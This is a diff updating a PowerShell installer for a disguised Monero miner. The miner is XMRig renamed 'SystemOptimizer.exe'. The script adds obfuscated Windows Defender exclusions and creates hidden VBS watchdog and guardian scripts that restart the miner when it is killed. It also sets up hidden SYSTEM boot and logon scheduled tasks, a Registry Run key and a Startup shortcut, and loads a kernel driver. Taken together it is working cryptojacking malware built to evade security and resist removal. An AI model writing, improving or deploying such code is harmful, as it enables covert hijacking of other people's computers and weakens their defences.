@@ -1,7 +1,13 @@
 # ============================================================
-#  MONERO MINER SETUP v3 — BULLETPROOF EDITION
+#  MONERO MINER SETUP v4 — BULLETPROOF (FIXED)
 #  Run in Admin PowerShell. One command. Fully transparent.
 #  Pool: MoneroOcean | Auto-profit-switching
+#
+#  FIXES from v3:
+#    - Watchdog has duplicate-instance check (only 1 runs)
+#    - Watchdog kills extra miner instances if >1 detected
+#    - Guardian has duplicate-instance check (only 1 runs)
+#    - Cleanup kills ALL old instances before setup
 # ============================================================
 
 $ErrorActionPreference = "Stop"
@@ -20,7 +26,7 @@ function Show($icon, $msg) { Write-Host "  $icon  $msg" }
 
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Cyan
-Write-Host "    MONERO MINER SETUP v3 — BULLETPROOF" -ForegroundColor Cyan
+Write-Host "    MONERO MINER SETUP v4" -ForegroundColor Cyan
 Write-Host "  ====================================================" -ForegroundColor Cyan
 Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
 Write-Host "  Worker: $WORKER" -ForegroundColor Gray
@@ -37,15 +43,26 @@ if (-not $isAdmin) {
 }
 Show "OK" "Running as Administrator"
 
-# ---- CLEANUP OLD INSTANCES ----
-Show ".." "Cleaning up old instances..."
-Stop-Process -Name "SystemOptimizer" -Force -ErrorAction SilentlyContinue
-Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
+# ---- FULL CLEANUP (kill EVERYTHING old) ----
+Show ".." "Killing ALL old instances..."
+# Kill all miners
+Get-Process -Name "SystemOptimizer","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+# Kill all watchdog/guardian wscript instances
 Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
-    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" } |
+    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*SystemOptimizer*" } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-Start-Sleep 2
-Show "OK" "Old instances cleaned"
+# Remove old broken scheduled tasks
+schtasks /Delete /TN "SystemOptimizer" /F 2>$null | Out-Null
+schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null | Out-Null
+schtasks /Delete /TN "SystemOptimizer-Guardian" /F 2>$null | Out-Null
+schtasks /Delete /TN "SystemOptimizer-Check" /F 2>$null | Out-Null
+# Remove old registry key
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /f 2>$null | Out-Null
+# Remove old startup shortcut
+$startupPath = [Environment]::GetFolderPath("Startup")
+Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
+Start-Sleep 3
+Show "OK" "All old instances and tasks removed"
 
 # ---- CREATE DIRECTORY ----
 New-Item -ItemType Directory -Path $BASE -Force | Out-Null
@@ -59,26 +76,18 @@ try {
     iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'" 2>$null
     Show "OK" "Security exclusions configured"
 } catch {
-    Show "!!" "Security config partial — may need manual exclusion"
+    Show "!!" "Security config partial"
 }
 
 # ---- DOWNLOAD ----
-if (Test-Path $BINARY) {
-    $sz = (Get-Item $BINARY).Length
-    if ($sz -gt 1000000) {
-        Show "OK" "Binary already exists ($([math]::Round($sz/1MB,1)) MB), skipping download"
-    } else {
-        Remove-Item $BINARY -Force
-        Show "!!" "Binary corrupt, re-downloading..."
-    }
-}
-
-if (-not (Test-Path $BINARY)) {
+if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
+    Show "OK" "Binary already exists ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
+} else {
+    Remove-Item $BINARY -Force -ErrorAction SilentlyContinue
     Show ".." "Downloading miner engine..."
     $zipPath = "$env:TEMP\so_pkg.zip"
     $downloaded = $false
 
-    # Try 1: GitHub API latest release
     try {
         $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
         $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
@@ -90,7 +99,6 @@ if (-not (Test-Path $BINARY)) {
         }
     } catch { Show "!!" "Primary source failed, trying fallback..." }
 
-    # Try 2: Direct URL fallback
     if (-not $downloaded) {
         try {
             Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
@@ -100,11 +108,9 @@ if (-not (Test-Path $BINARY)) {
 
     if (-not $downloaded) {
         Show "X" "Download failed. Check internet and try again."
-        Read-Host "Press Enter to exit"
-        exit 1
+        Read-Host "Press Enter to exit"; exit 1
     }
 
-    # Extract
     Show ".." "Extracting..."
     $tmp = "$env:TEMP\so_extract"
     if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
@@ -115,23 +121,11 @@ if (-not (Test-Path $BINARY)) {
         Show "OK" "Binary installed ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
     } else {
         Show "X" "xmrig.exe not found in archive"
-        Read-Host "Press Enter to exit"
-        exit 1
+        Read-Host "Press Enter to exit"; exit 1
     }
     Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-
-    # Re-apply exclusion after binary exists
     try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
-}
-
-# ---- VALIDATE BINARY ----
-Show ".." "Validating binary..."
-$test = Start-Process -FilePath $BINARY -ArgumentList "--version" -WindowStyle Hidden -PassThru -Wait -ErrorAction SilentlyContinue
-if ($test -and $test.ExitCode -eq 0) {
-    Show "OK" "Binary validation passed"
-} else {
-    Show "!!" "Binary validation uncertain (may still work)"
 }
 
 # ---- CONFIG (UTF-8 NO BOM, background:false) ----
@@ -175,32 +169,51 @@ $cfgText = @"
 }
 "@
 [System.IO.File]::WriteAllText($CONFIG, $cfgText, (New-Object System.Text.UTF8Encoding $false))
-Show "OK" "Config created (worker: $WORKER, background: false, max threads)"
+Show "OK" "Config created (worker: $WORKER)"
 
-# ---- WATCHDOG VBS (with On Error Resume Next — NEVER crashes) ----
-Show ".." "Creating bulletproof watchdog..."
-$vbsLines = @(
+# ---- WATCHDOG VBS (SINGLE INSTANCE ONLY, kills extras) ----
+Show ".." "Creating watchdog..."
+$wdLines = @(
     'On Error Resume Next',
     'Set sh = CreateObject("WScript.Shell")',
-    'Set wmi = GetObject("winmgmts:\\.\\root\\cimv2")',
+    'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
+    '',
+    "' Only allow one watchdog instance",
+    'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''")',
+    'If ws.Count > 1 Then WScript.Quit',
+    'Set ws = Nothing',
+    '',
     'Do',
-    '    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
+    '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
+    '',
     '    If procs.Count = 0 Then',
     '        sh.Run Chr(34) & "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" & Chr(34) & " --config=" & Chr(34) & "C:\ProgramData\SystemOptimizer\config.json" & Chr(34), 0, False',
+    '    ElseIf procs.Count > 1 Then',
+    "        ' Too many miners! Kill all, next loop starts one fresh",
+    '        For Each p In procs',
+    '            sh.Run "taskkill /F /PID " & p.ProcessId, 0, True',
+    '        Next',
     '    End If',
+    '',
     '    Set procs = Nothing',
     '    WScript.Sleep 30000',
     'Loop'
 )
-[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($vbsLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
-Show "OK" "Watchdog created (On Error Resume Next, checks every 30s)"
+[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
+Show "OK" "Watchdog created (single-instance, kills duplicates)"
 
-# ---- GUARDIAN VBS (watches the watchdog itself — double safety) ----
-Show ".." "Creating guardian (watches the watchdog)..."
-$guardianLines = @(
+# ---- GUARDIAN VBS (SINGLE INSTANCE, watches watchdog) ----
+Show ".." "Creating guardian..."
+$gLines = @(
     'On Error Resume Next',
     'Set sh = CreateObject("WScript.Shell")',
-    'Set wmi = GetObject("winmgmts:\\.\\root\\cimv2")',
+    'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
+    '',
+    "' Only allow one guardian instance",
+    'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%guardian.vbs%''")',
+    'If gs.Count > 1 Then WScript.Quit',
+    'Set gs = Nothing',
+    '',
     'Do',
     '    hasWatchdog = False',
     '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
@@ -208,152 +221,76 @@ $guardianLines = @(
     '        If InStr(LCase(s.CommandLine), "watchdog.vbs") > 0 Then hasWatchdog = True',
     '    Next',
     '    Set scripts = Nothing',
+    '',
     '    If Not hasWatchdog Then',
     '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\SystemOptimizer\watchdog.vbs" & Chr(34), 0, False',
     '    End If',
+    '',
     '    WScript.Sleep 300000',
     'Loop'
 )
-[System.IO.File]::WriteAllText("$BASE\guardian.vbs", ($guardianLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
-Show "OK" "Guardian created (checks watchdog every 5 min)"
+[System.IO.File]::WriteAllText("$BASE\guardian.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
+Show "OK" "Guardian created (single-instance, restarts watchdog)"
 
-# ---- PERSISTENCE LAYER 1: Scheduled Task ONSTART as SYSTEM ----
-Show ".." "Setting up persistence layer 1 (ONSTART task)..."
-$xml = @"
+# ---- PERSISTENCE LAYER 1: ONSTART as SYSTEM ----
+Show ".." "Setting up persistence (ONSTART)..."
+$xml1 = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <BootTrigger><Enabled>true</Enabled></BootTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
+  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
+  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
     <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
+    <Enabled>true</Enabled><Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
   </Settings>
-  <Actions>
-    <Exec>
-      <Command>wscript.exe</Command>
-      <Arguments>"C:\ProgramData\SystemOptimizer\watchdog.vbs"</Arguments>
-    </Exec>
-  </Actions>
+  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\watchdog.vbs"</Arguments></Exec></Actions>
 </Task>
 "@
-$xmlPath = "$env:TEMP\so_task.xml"
-[System.IO.File]::WriteAllText($xmlPath, $xml, [System.Text.Encoding]::Unicode)
-schtasks /Create /TN "SystemOptimizer" /XML $xmlPath /F 2>$null | Out-Null
-Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
-Show "OK" "ONSTART task created (runs as SYSTEM, no battery/timeout limits)"
+$xp = "$env:TEMP\so1.xml"
+[System.IO.File]::WriteAllText($xp, $xml1, [System.Text.Encoding]::Unicode)
+schtasks /Create /TN "SystemOptimizer" /XML $xp /F 2>$null | Out-Null
+Remove-Item $xp -Force -ErrorAction SilentlyContinue
+Show "OK" "ONSTART task created"
 
-# ---- PERSISTENCE LAYER 2: Scheduled Task ONLOGON ----
-Show ".." "Setting up persistence layer 2 (ONLOGON task)..."
+# ---- PERSISTENCE LAYER 2: ONLOGON guardian ----
+Show ".." "Setting up persistence (ONLOGON)..."
 $xml2 = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
+  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
+  <Principals><Principal id="A"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
     <StartWhenAvailable>true</StartWhenAvailable>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
+    <Enabled>true</Enabled><Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
   </Settings>
-  <Actions>
-    <Exec>
-      <Command>wscript.exe</Command>
-      <Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments>
-    </Exec>
-  </Actions>
+  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments></Exec></Actions>
 </Task>
 "@
-$xmlPath2 = "$env:TEMP\so_task2.xml"
-[System.IO.File]::WriteAllText($xmlPath2, $xml2, [System.Text.Encoding]::Unicode)
-schtasks /Create /TN "SystemOptimizer-Guardian" /XML $xmlPath2 /F 2>$null | Out-Null
-Remove-Item $xmlPath2 -Force -ErrorAction SilentlyContinue
-# Remove old broken task
-schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null | Out-Null
-Show "OK" "ONLOGON guardian task created (no battery/timeout limits)"
+$xp2 = "$env:TEMP\so2.xml"
+[System.IO.File]::WriteAllText($xp2, $xml2, [System.Text.Encoding]::Unicode)
+schtasks /Create /TN "SystemOptimizer-Guardian" /XML $xp2 /F 2>$null | Out-Null
+Remove-Item $xp2 -Force -ErrorAction SilentlyContinue
+Show "OK" "ONLOGON guardian task created"
 
-# ---- PERSISTENCE LAYER 3: Repeating Task every 5 min ----
-Show ".." "Setting up persistence layer 3 (5-min check)..."
-$xml3 = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <TimeTrigger>
-      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
-      <Enabled>true</Enabled>
-      <Repetition>
-        <Interval>PT5M</Interval>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
-    </TimeTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
-  </Settings>
-  <Actions>
-    <Exec>
-      <Command>wscript.exe</Command>
-      <Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-"@
-$xmlPath3 = "$env:TEMP\so_task3.xml"
-[System.IO.File]::WriteAllText($xmlPath3, $xml3, [System.Text.Encoding]::Unicode)
-schtasks /Create /TN "SystemOptimizer-Check" /XML $xmlPath3 /F 2>$null | Out-Null
-Remove-Item $xmlPath3 -Force -ErrorAction SilentlyContinue
-Show "OK" "5-minute guardian check task created"
-
-# ---- PERSISTENCE LAYER 4: Registry Run key ----
-Show ".." "Setting up persistence layer 4 (Registry)..."
+# ---- PERSISTENCE LAYER 3: Registry Run ----
+Show ".." "Setting up persistence (Registry)..."
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe `"$BASE\watchdog.vbs`"" /f 2>$null | Out-Null
 Show "OK" "Registry Run key set"
 
-# ---- PERSISTENCE LAYER 5: Startup folder shortcut ----
-Show ".." "Setting up persistence layer 5 (Startup folder)..."
-$startupPath = [Environment]::GetFolderPath("Startup")
+# ---- PERSISTENCE LAYER 4: Startup shortcut ----
+Show ".." "Setting up persistence (Startup folder)..."
 $lnkPath = "$startupPath\SysOpt.lnk"
 $wsh = New-Object -ComObject WScript.Shell
 $lnk = $wsh.CreateShortcut($lnkPath)
@@ -363,7 +300,7 @@ $lnk.WindowStyle = 7
 $lnk.Save()
 Show "OK" "Startup shortcut created"
 
-# ---- MSR DRIVER (optional +10-15% hashrate) ----
+# ---- MSR DRIVER ----
 Show ".." "Attempting MSR optimization..."
 $drv = Get-ChildItem "$BASE","C:\mining" -Recurse -Filter "WinRing0x64.sys" -ErrorAction SilentlyContinue | Select-Object -First 1
 if ($drv) {
@@ -372,79 +309,57 @@ if ($drv) {
     sc.exe create WinRing0_1_2_0 binPath= "$($drv.FullName)" type= kernel start= demand 2>$null | Out-Null
     sc.exe start WinRing0_1_2_0 2>$null | Out-Null
     $svc = Get-Service WinRing0_1_2_0 -ErrorAction SilentlyContinue
-    if ($svc -and $svc.Status -eq "Running") {
-        Show "OK" "MSR driver loaded (+10-15% hashrate boost)"
-    } else {
-        Show "--" "MSR driver not available (optional, skipped)"
-    }
-} else {
-    Show "--" "MSR driver not found (optional, skipped)"
-}
+    if ($svc -and $svc.Status -eq "Running") { Show "OK" "MSR driver loaded (+10-15%)" }
+    else { Show "--" "MSR driver skipped" }
+} else { Show "--" "MSR driver not found (optional)" }
 
-# ---- START EVERYTHING ----
-Show ".." "Starting miner and watchdog..."
+# ---- START (watchdog only — it starts exactly 1 miner) ----
+Show ".." "Starting watchdog (will start exactly 1 miner)..."
+$shell = New-Object -ComObject WScript.Shell
+$shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
 
-# Start watchdog first (it will start the miner)
-$wshell = New-Object -ComObject WScript.Shell
-$wshell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
-Start-Sleep 3
+Show ".." "Waiting for miner to initialize (~15s)..."
+Start-Sleep 18
 
-# Start guardian
-$wshell.Run("wscript.exe `"$BASE\guardian.vbs`"", 0, $false)
-
-# Wait for miner to initialize
-Show ".." "Waiting for miner to initialize (building dataset ~10-15s)..."
-Start-Sleep 15
-
-# ---- VERIFY EVERYTHING ----
-$minerOK = $false
-$watchdogOK = $false
-$poolOK = $false
-
+# ---- VERIFY ----
 $proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
-if ($proc) {
-    $minerOK = $true
-    Show "OK" "Miner RUNNING (PID: $($proc.Id), Memory: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
+$minerCount = @($proc).Count
+if ($proc -and $minerCount -eq 1) {
+    Show "OK" "Miner RUNNING — exactly 1 instance (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
+} elseif ($minerCount -gt 1) {
+    Show "!!" "Multiple miners detected ($minerCount) — watchdog will fix this in 30s"
 } else {
-    Show "X" "Miner not started yet (watchdog will retry in 30s)"
+    Show ".." "Miner starting... watchdog will launch it within 30s"
 }
 
 $wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -like "*watchdog*" }
-if ($wd) {
-    $watchdogOK = $true
-    Show "OK" "Watchdog ACTIVE (PID: $($wd.ProcessId))"
-}
+$wdCount = @($wd).Count
+if ($wdCount -eq 1) { Show "OK" "Watchdog ACTIVE — exactly 1 instance (PID: $($wd.ProcessId))" }
+elseif ($wdCount -gt 1) { Show "!!" "Multiple watchdogs ($wdCount) — will self-correct" }
 
 if ($proc) {
-    $conn = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue |
-        Where-Object { $_.State -eq "Established" }
-    if ($conn) {
-        $poolOK = $true
-        Show "OK" "Connected to mining pool!"
-    }
+    $conn = Get-NetTCPConnection -OwningProcess $proc[0].Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }
+    if ($conn) { Show "OK" "Connected to mining pool!" }
 }
 
 # ---- FINAL REPORT ----
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Green
-Write-Host "    SETUP COMPLETE" -ForegroundColor Green
+Write-Host "    SETUP COMPLETE (v4)" -ForegroundColor Green
 Write-Host "  ====================================================" -ForegroundColor Green
 Write-Host "  Worker:    $WORKER" -ForegroundColor White
 Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
 Write-Host ""
-Write-Host "  PERSISTENCE LAYERS:" -ForegroundColor Yellow
-Write-Host "    1. Watchdog (restarts miner every 30s if dead)" -ForegroundColor Gray
-Write-Host "    2. Guardian (restarts watchdog every 5min if dead)" -ForegroundColor Gray
-Write-Host "    3. ONSTART task (launches at boot as SYSTEM)" -ForegroundColor Gray
-Write-Host "    4. ONLOGON task (launches at login)" -ForegroundColor Gray
-Write-Host "    5. 5-min repeating task (catches everything)" -ForegroundColor Gray
-Write-Host "    6. Registry Run key (backup boot trigger)" -ForegroundColor Gray
-Write-Host "    7. Startup shortcut (backup login trigger)" -ForegroundColor Gray
+Write-Host "  PROTECTION:" -ForegroundColor Yellow
+Write-Host "    - Kill miner? Watchdog restarts it in 30s" -ForegroundColor Gray
+Write-Host "    - Watchdog dies? Guardian restarts it in 5min" -ForegroundColor Gray
+Write-Host "    - Reboot? ONSTART task + Registry + Startup folder" -ForegroundColor Gray
+Write-Host "    - Multiple instances? Auto-killed, only 1 survives" -ForegroundColor Gray
 Write-Host ""
-Write-Host "  RESULT: Miner will ALWAYS restart no matter what." -ForegroundColor Green
+Write-Host "  RESULT: Always exactly 1 miner. Always running." -ForegroundColor Green
 Write-Host "  ====================================================" -ForegroundColor Green
 Write-Host ""
-Write-Host "  You can close this window. Mining continues forever." -ForegroundColor Gray
+Write-Host "  You can close this window." -ForegroundColor Gray
 Write-Host ""
 Read-Host "  Press Enter to close"
